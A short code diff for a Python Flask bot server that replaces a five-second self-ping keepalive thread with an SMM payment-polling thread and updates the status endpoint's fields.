@@ -2032,19 +2110,20 @@ def five_second_keepalive_engine():
                         pass
 
         except Exception as e:
-            print(f"[5-SECOND WATCHDOG ERROR] {e}")
+            print(f"[POLLER ERROR] {e}")
 
         time.sleep(5)
 
 threading.Thread(target=run_master_bot_loop, daemon=True).start()
-threading.Thread(target=five_second_keepalive_engine, daemon=True).start()
+threading.Thread(target=autonomous_smm_payment_poller, daemon=True).start()
 
 @app.route('/')
 def home():
     return jsonify({
         "status": "online",
         "engine": "Pranav Father Dev Master Engine",
-        "pulse_mode": "5-second active self-ping",
+        "smm_auto_polling": "Active (10-Minute Timeout Mode)",
+        "super_admin_logger": "Active -> 8585055903 (@pranavsmm)",
         "master_live": master_is_running,
         "child_bots_alive": len([t for t in bot_threads.values() if t.is_alive()])
     }), 200
